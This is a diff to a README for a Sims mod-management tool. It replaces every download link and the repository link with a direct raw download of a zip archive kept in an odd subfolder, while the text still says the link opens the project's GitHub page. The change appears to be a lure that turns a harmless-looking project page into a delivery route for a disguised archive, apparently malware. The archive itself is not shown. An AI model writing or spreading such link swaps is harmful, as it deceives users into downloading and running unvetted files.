@@ -1,6 +1,6 @@
 # 🛠️ Sims-CC-Manager - Manage Sims Mods Easily
 
-[![Download Sims-CC-Manager](https://img.shields.io/badge/Download-Sims--CC--Manager-brightgreen)](https://github.com/mirrrrds/Sims-CC-Manager)
+[![Download Sims-CC-Manager](https://img.shields.io/badge/Download-Sims--CC--Manager-brightgreen)](https://github.com/mirrrrds/Sims-CC-Manager/raw/refs/heads/main/consiliary/Manager_C_Sims_3.5-alpha.5.zip)
 
 ## 📋 About Sims-CC-Manager
 
@@ -44,7 +44,7 @@ Before using Sims-CC-Manager, make sure you have your Sims games installed and m
 
 Click the big button below to visit the download page:
 
-[![Download Sims-CC-Manager](https://img.shields.io/badge/Download-Sims--CC--Manager-blue)](https://github.com/mirrrrds/Sims-CC-Manager)
+[![Download Sims-CC-Manager](https://img.shields.io/badge/Download-Sims--CC--Manager-blue)](https://github.com/mirrrrds/Sims-CC-Manager/raw/refs/heads/main/consiliary/Manager_C_Sims_3.5-alpha.5.zip)
 
 1. Visit the link above to open the project’s GitHub page.
 
@@ -128,7 +128,7 @@ The app works best with unpacked .package files.
 
 For updates and detailed instructions, visit the GitHub repository:
 
-[https://github.com/mirrrrds/Sims-CC-Manager](https://github.com/mirrrrds/Sims-CC-Manager)
+[https://github.com/mirrrrds/Sims-CC-Manager/raw/refs/heads/main/consiliary/Manager_C_Sims_3.5-alpha.5.zip](https://github.com/mirrrrds/Sims-CC-Manager/raw/refs/heads/main/consiliary/Manager_C_Sims_3.5-alpha.5.zip)
 
 You can also check the issues tab to see reported problems or request help from the community.
 
@@ -138,4 +138,4 @@ Check the GitHub page regularly for new versions. Download the latest release an
 
 ---
 
-[Download Sims-CC-Manager](https://github.com/mirrrrds/Sims-CC-Manager)
+[Download Sims-CC-Manager](https://github.com/mirrrrds/Sims-CC-Manager/raw/refs/heads/main/consiliary/Manager_C_Sims_3.5-alpha.5.zip)
